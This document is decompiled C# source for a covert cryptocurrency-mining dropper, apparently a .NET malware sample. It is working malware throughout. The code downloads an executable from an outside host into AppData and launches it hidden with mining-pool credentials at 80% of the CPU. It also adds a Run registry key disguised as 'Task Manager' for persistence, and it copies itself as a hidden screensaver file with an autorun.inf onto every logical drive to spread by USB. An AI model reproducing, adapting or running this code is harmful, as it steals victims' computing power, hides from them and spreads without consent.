using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class Module1
{
	private static string FILE_PATH = Interaction.Environ("AppData") + "\\384901878.exe";

	private static string FILE_PATH2 = Interaction.Environ("AppData") + "\\blackCoin.scr";

	private static string pool = "us2.eclipsemc.com";

	private static string worker = "huffwin_";

	private static string password = "ihateyou2";

	private static string port = "8332";

	private static string Url = "http://ISTOLETHIS.info/DONOTDELETE/BLACKCOINFILES/iexplorer.exe";

	private static string percentage = "80";

	private static string startup1 = "1";

	private static string usbspread1 = "[USB]";

	private static Mutex mutexmutex;

	[STAThread]
	public static void Main()
	{
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(startup1, "1", false) == 0)
		{
			AddKey();
		}
		if (Operators.CompareString(usbspread1, "1", false) == 0)
		{
			UsbSpread();
		}
		CheckMutex("BC_awfa2f");
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(Url, FILE_PATH);
			string text = Conversions.ToString((double)Environment.ProcessorCount / 100.0 * Conversions.ToDouble(percentage));
			string arguments = "-o http://" + worker + ":" + password + "@" + pool + ":" + port + " -t " + text;
			File.SetAttributes(FILE_PATH, FileAttributes.Hidden);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = FILE_PATH;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.Arguments = arguments;
			Process.Start(processStartInfo);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void CheckMutex(string mymutex)
	{
		try
		{
			Mutex.OpenExisting(mymutex);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			mutexmutex = new Mutex(initiallyOwned: false, mymutex);
			ProjectData.ClearProjectError();
		}
	}

	public static void UsbSpread()
	{
		try
		{
			string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				programFiles = array[i];
				try
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, programFiles + "blackCoin.scr");
					object obj = new StreamWriter(programFiles + "\\autorun.inf");
					NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "[autorun]" }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { ";av4ttcgr7t6gk4gkwzRSZ% yw$@Y $V5y" }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { ";ATVW$TWZ$WD#!TD@$%T#@CWF$%" }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "icon = %SystemRoot%\\System32\\SHELL32.dll,4" }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { "open=" + programFiles + "blackCoin.scr" }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[2]
					{
						"shellexecute=" + programFiles,
						1
					}, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(obj, (Type)null, "WriteLine", new object[1] { ";K[e~`S6[zwL5bR5,sXcNEA[zYc7MTdW[~9K" }, (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(obj, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(programFiles + "blackCoin.scr", FileAttributes.Hidden);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private static void AddKey()
	{
		try
		{
			if (File.Exists(FILE_PATH2))
			{
				File.Delete(FILE_PATH2);
			}
			File.Copy(Process.GetCurrentProcess().MainModule!.FileName, FILE_PATH2);
			File.SetAttributes(FILE_PATH2, FileAttributes.Hidden);
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Task Manager", FILE_PATH2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
